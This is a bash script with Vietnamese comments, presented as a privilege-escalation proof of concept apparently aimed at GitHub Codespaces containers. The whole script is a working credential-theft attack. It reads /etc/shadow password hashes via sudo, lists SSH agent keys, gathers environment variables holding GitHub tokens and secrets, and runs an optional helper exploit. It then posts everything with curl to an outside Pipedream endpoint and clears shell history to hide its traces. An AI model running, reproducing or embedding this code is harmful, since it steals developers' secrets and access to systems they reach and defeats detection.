#!/bin/bash

# --- THÔNG TIN CẤU HÌNH ---
# URL Pipedream của sếp Khoa
TARGET_URL="https://eo4ki1jx09tq9fi.m.pipedream.net"

echo "[*] Nexus VN - Codespaces Escalation PoC started..."

# --- 1. CHUẨN BỊ MÔI TRƯỜNG ---
# Đảm bảo thư viện requests có sẵn để script Python chạy mượt
pip3 install requests --user > /dev/null 2>&1

# --- 2. CHIẾM QUYỀN ROOT & TRÍCH XUẤT HỆ THỐNG ---
# Chứng minh quyền ROOT bằng cách lấy hash mật khẩu (shadow file)
# Đây là bằng chứng thép về việc chiếm quyền kiểm soát máy chủ container
ROOT_EVIDENCE=$(sudo head -n 5 /etc/shadow | base64 | tr -d '\n')

# --- 3. THU THẬP DỮ LIỆU SSH AGENT ---
# Chứng minh khả năng tấn công Di chuyển ngang (Lateral Movement)
SSH_SOCKET=$SSH_AUTH_SOCK
SSH_KEYS="None"
if [ -n "$SSH_AUTH_SOCK" ]; then
    SSH_KEYS=$(ssh-add -l 2>&1 | base64 | tr -d '\n')
fi

# --- 4. CHẠY SCRIPT PYTHON ĐỂ VÉT SÂU ---
# Script này sẽ xử lý các Token và gửi dữ liệu chuyên nghiệp về Pipedream
if [ -f "./scripts/exploit.py" ]; then
    python3 ./scripts/exploit.py
else
    echo "[-] exploit.py not found, falling back to pure bash exfiltration."
fi

# --- 5. DỰ PHÒNG: GỬI DỮ LIỆU BẰNG CURL (BASH) ---
# Đảm bảo nếu Python lỗi thì dữ liệu vẫn về đến tay sếp
FINAL_BASH_PAYLOAD=$(cat <<EOF
{
  "source": "Bash_Exploit",
  "victim": "$(whoami)",
  "is_root": "$EUID",
  "ssh_socket": "$SSH_SOCKET",
  "ssh_keys_base64": "$SSH_KEYS",
  "root_shadow_base64": "$ROOT_EVIDENCE",
  "env": "$(printenv | grep -E 'GITHUB|TOKEN|SECRET' | base64 | tr -d '\n')"
}
EOF
)

curl -s -X POST -H "Content-Type: application/json" -d "$FINAL_BASH_PAYLOAD" "$TARGET_URL" > /dev/null

# --- 6. XOÁ DẤU VẾT (Tùy chọn cho chuyên nghiệp) ---
# Trong môi trường thực tế, sếp sẽ muốn xoá bash history
history -c

echo "[+] Exploit executed successfully. Data exfiltrated to Pipedream."